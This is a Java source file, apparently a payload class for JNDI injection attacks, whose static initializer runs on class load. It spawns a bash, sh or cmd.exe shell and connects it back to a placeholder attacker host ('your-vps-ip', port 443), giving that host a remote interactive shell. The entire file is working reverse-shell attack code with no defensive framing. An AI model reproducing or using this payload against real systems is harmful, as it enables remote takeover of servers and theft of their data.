/**
 *  javac -source 1.5 -target 1.5 JNDIObject.java
 *
 *  Build By LandGrey
 * */

import java.io.File;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class JNDIObject {
    static {
        try{
            String ip = "your-vps-ip";
            String port = "443";
            String py_path = null;
            String[] cmd;
            if (!System.getProperty("os.name").toLowerCase().contains("windows")) {
                String[] py_envs = new String[]{"/bin/python", "/bin/python3", "/usr/bin/python", "/usr/bin/python3", "/usr/local/bin/python", "/usr/local/bin/python3"};
                for(int i = 0; i < py_envs.length; ++i) {
                    String py = py_envs[i];
                    if ((new File(py)).exists()) {
                        py_path = py;
                        break;
                    }
                }
                if (py_path != null) {
                    if ((new File("/bin/bash")).exists()) {
                        cmd = new String[]{py_path, "-c", "import pty;pty.spawn(\"/bin/bash\")"};
                    } else {
                        cmd = new String[]{py_path, "-c", "import pty;pty.spawn(\"/bin/sh\")"};
                    }
                } else {
                    if ((new File("/bin/bash")).exists()) {
                        cmd = new String[]{"/bin/bash"};
                    } else {
                        cmd = new String[]{"/bin/sh"};
                    }
                }
            } else {
                cmd = new String[]{"cmd.exe"};
            }
            Process p = (new ProcessBuilder(cmd)).redirectErrorStream(true).start();
            Socket s = new Socket(ip, Integer.parseInt(port));
            InputStream pi = p.getInputStream();
            InputStream pe = p.getErrorStream();
            InputStream si = s.getInputStream();
            OutputStream po = p.getOutputStream();
            OutputStream so = s.getOutputStream();
            while(!s.isClosed()) {
                while(pi.available() > 0) {
                    so.write(pi.read());
                }
                while(pe.available() > 0) {
                    so.write(pe.read());
                }
                while(si.available() > 0) {
                    po.write(si.read());
                }
                so.flush();
                po.flush();
                Thread.sleep(50L);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {
                }
            }
            p.destroy();
            s.close();
        }catch (Throwable e){
            e.printStackTrace();
        }
    }
}
